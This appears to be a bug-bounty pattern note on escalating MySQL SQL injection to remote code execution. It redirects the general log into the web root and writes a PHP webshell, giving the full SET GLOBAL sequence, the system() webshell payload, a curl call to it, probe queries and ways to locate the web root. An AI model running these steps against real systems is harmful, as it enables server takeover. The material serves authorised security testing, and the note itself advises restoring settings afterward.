---
type: pattern
title: "SQLi to RCE via MySQL General Log"
vuln_class: "sqli"
severity_typical: "P1"
detection_method: "manual"
bypass_table: false
status: active
last_updated: "2026-06-15"
tags: [sqli, rce, mysql, general-log, bb-pattern]
---

# Pattern — SQLi to RCE via MySQL General Log

## Scenario

The target has a SQL Injection (MySQL), but `secure_file_priv` is set to `NULL` or a restricted path, causing `INTO OUTFILE` / `LOAD_FILE` / UDF-based techniques to all fail.

## Core Technique

Use `SET GLOBAL general_log_file` + `SET GLOBAL general_log = ON` to redirect the MySQL general log into the web root, turning it into a webshell.

**Prerequisites (all must hold):**

| # | Prerequisite | How to verify |
|---|---------------|----------------|
| 1 | Stacked queries supported | `'; SELECT SLEEP(N);-- -` produces a linear delay |
| 2 | SUPER privilege | `SELECT Super_priv FROM mysql.user WHERE user=CURRENT_USER()` |
| 3 | general_log is controllable | `SELECT @@general_log` (needs to be OFF to matter) |
| 4 | Web root path known | Must be guessed or leaked (usually the hardest step) |

## Attack Steps

```sql
-- Step 1: Point the log file at the webshell path
SET GLOBAL general_log_file = '/var/www/html/shell.php';
-- Step 2: Turn on the general log
SET GLOBAL general_log = ON;
-- Step 3: Execute a SELECT so the PHP payload gets written into the log
SELECT '<?php system($_GET["c"]); ?>';
-- Step 4: Turn the log back off
SET GLOBAL general_log = OFF;
-- Step 5: Access the webshell
-- curl http://target/shell.php?c=whoami
```

## Why Not INTO OUTFILE

| Method | Constrained by | Result |
|--------|------------------|--------|
| `INTO OUTFILE` | `secure_file_priv` | If NULL/restricted path → fails |
| `LOAD_FILE` | `secure_file_priv` | Same → fails |
| UDF (`lib_mysqludf_sys`) | Requires writing into `@@plugin_dir` | Also subject to `secure_file_priv` → fails |
| **`SET GLOBAL general_log_file`** | **Only requires SUPER privilege** | **Not subject to `secure_file_priv` → works** |

## Web Root Detection Techniques

1. Infer the install path from `@@basedir` / `@@datadir` (e.g. `C:\Ampps\` → web root likely `C:\Ampps\www\`)
2. PHP error triggering (leaks the path when `display_errors=On`)
3. `LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')` to read the vhost config (if `secure_file_priv` allows)
4. IIS `~` short-filename enumeration, ADS (`::$DATA`) detection
5. Known framework default paths: IIS = `C:\inetpub\wwwroot\`, XAMPP = `C:\xampp\htdocs\`, AMPPS = `C:\Ampps\www\`

## Stop-Loss Discipline

- Before writing anything, set `general_log_file` to a path under `@@tmpdir` to confirm `SET GLOBAL` works
- **Restore afterward**: after testing, always run `SET GLOBAL general_log = OFF` and restore the original `general_log_file` path
- Do not actually write a live webshell — confirming that all prerequisites pass is sufficient to document the finding

## Sources

- Observed against a vendor ERP product — 7 of 8 prerequisites verified; `secure_file_priv='NULL'` blocked `OUTFILE`, and the general-log technique succeeded as the working alternative
- Reference: PayloadsAllTheThings / HackTricks MySQL RCE
